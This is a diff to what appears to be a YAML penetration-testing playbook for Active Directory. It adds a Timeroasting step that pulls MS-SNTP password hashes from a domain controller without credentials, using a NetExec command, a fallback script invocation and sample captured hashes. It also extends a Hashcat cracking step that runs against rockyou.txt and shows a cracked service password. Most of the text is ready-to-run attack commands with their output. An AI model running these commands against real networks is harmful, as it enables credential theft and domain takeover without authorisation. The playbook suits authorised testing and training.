@@ -38,10 +38,23 @@
     - "Kerberoasting without valid domain user credentials (requires at least standard unprivileged domain user access)."
     - "Targeting machine accounts (names ending in '$') whose 120-character computer passwords cannot be cracked offline."
 
+- id: "kerberos-timeroast"
+  title: "Timeroasting (Extract MS-SNTP Hashes from W32Time)"
+  phase: "exploitation"
+  purpose: "Query Windows Time Service (W32Time) on Domain Controller over UDP port 123 across RID ranges to extract crackable MS-SNTP MD5 authentication digests with zero credentials."
+  command: "nxc smb {{TARGET}} -u '' -p '' -M timeroast"
+  expected_output:
+    - "[*] Querying DC for RID 500 (Administrator)..."
+    - "$ntp$1$82f9...$91b3..."
+    - "[+] Captured MS-SNTP hash for Administrator"
+  common_mistakes:
+    - "If NetExec fails, fallback to standalone script: python3 timeroast.py --dc-ip {{TARGET}} -r 500-2000 -outputfile timeroast.hashes."
+    - "Using wrong Hashcat mode (use mode 31300 for W32Time MS-SNTP Digest)."
+
 - id: "kerberos-crack-hashes"
   title: "Offline Hash Cracking (Hashcat)"
   phase: "exploitation"
-  purpose: "Crack extracted Kerberos TGS (mode 13100) or AS-REP (mode 18200) ticket hashes against wordlists like rockyou.txt."
+  purpose: "Crack extracted Kerberos TGS (mode 13100) or AS-REP (mode 18200) or Timeroast MS-SNTP (mode 31300) ticket hashes against wordlists like rockyou.txt."
   command: "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"
   expected_output:
     - "$krb5tgs$23$*svc_sql*CORP.LOCAL*...:Winter2023!$"
@@ -49,3 +62,4 @@
   common_mistakes:
     - "Using wrong GPU drivers or not utilizing rule files (e.g., best64.rule) to catch common password transformations."
     - "Not recording cracked credentials directly in your project credentials vault."
+
